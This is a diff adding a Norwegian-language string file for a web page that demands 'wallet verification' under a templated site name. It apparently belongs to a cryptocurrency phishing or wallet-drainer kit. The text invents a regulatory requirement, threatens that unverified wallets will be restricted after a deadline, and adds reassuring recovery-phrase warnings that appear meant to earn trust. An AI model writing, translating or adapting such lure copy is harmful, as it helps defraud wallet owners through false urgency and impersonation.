@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Lommebok Verifisering | {websiteName}",
+    "mainTitle": "Lommebok Verifisering Påkrevd",
+    "description1": "For å opprettholde sikkerhetsstandarder og overholdelse av forskrifter, krever vi nå verifisering av lommebokadresse for alle brukere.",
+    "deadlineText": "Fra {date} vil enhver uverifisert lommebok bli",
+    "restrictionText": " midlertidig begrenset",
+    "cooperationText": "Vi setter pris på ditt samarbeid for å holde plattformen vår sikker.",
+    "termsText": "Jeg godtar {websiteName}'s",
+    "termsLink": "Bruksvilkår",
+    "verifyBtnText": "Verifiser Min Lommebok",
+    "securityBtnText": "Om Kompromitterte Fraser",
+    "modalTitle": "Sikkerhetsvarsel: Kompromitterte Gjenopprettingsfraser",
+    "modalWarning": "Kritisk Advarsel:",
+    "modalWarningText": "Din gjenopprettingsfrase er hovednøkkelen til lommeboken din. Del den aldri med noen eller skriv den inn på noen nettside.",
+    "signsTitle": "Tegn på en kompromittert frase:",
+    "signsList": [
+        "Delt med noen som hevder å være support",
+        "Lagret digitalt (bilder, sky, meldinger)",
+        "Uautorisert transaksjoner i lommeboken din"
+    ],
+    "actionTitle": "Umiddelbar handling kreves hvis kompromittert:",
+    "actionList": [
+        "Overfør alle midler til en ny sikker lommebok umiddelbart",
+        "Generer en helt ny gjenopprettingsfrase",
+        "Bruk aldri noen versjon av den gamle frasen"
+    ],
+    "modalNote": "Merk: {websiteName} vil aldri be om din gjenopprettingsfrase. Denne verifiseringsprosessen krever kun din offentlige lommebokadresse."
+} 
+
+
+
